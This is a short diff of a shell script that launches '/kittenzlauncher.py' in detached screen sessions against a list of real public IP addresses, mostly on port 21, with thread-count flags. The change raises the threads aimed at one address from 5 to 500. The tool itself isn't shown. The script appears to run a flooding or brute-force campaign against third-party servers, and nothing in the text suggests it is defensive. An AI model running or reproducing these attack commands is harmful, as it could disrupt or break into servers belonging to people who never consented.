@@ -26,7 +26,7 @@ screen -dmS i python /kittenzlauncher.py -p -t 50 25465 45.35.54.118
 screen -dmS j python /kittenzlauncher.py -p 21 -t 5 107.174.19.150
 screen -dmS k python /kittenzlauncher.py -p 21 -t 5 107.174.19.154
 screen -dmS l python /kittenzlauncher.py -p 21 -t 5 176.31.103.7
-screen -dmS m python /kittenzlauncher.py -p 21 -t 5 176.31.103.228
+screen -dmS m python /kittenzlauncher.py -p 21 -t 500 176.31.103.228
 screen -dmS n python /kittenzlauncher.py -p 21 -t 5 45.35.54.3
 screen -dmS o python /kittenzlauncher.py -p 21 -t 5 45.35.54.5
 screen -dmS p python /kittenzlauncher.py -p 21 -t 5 45.35.54.14
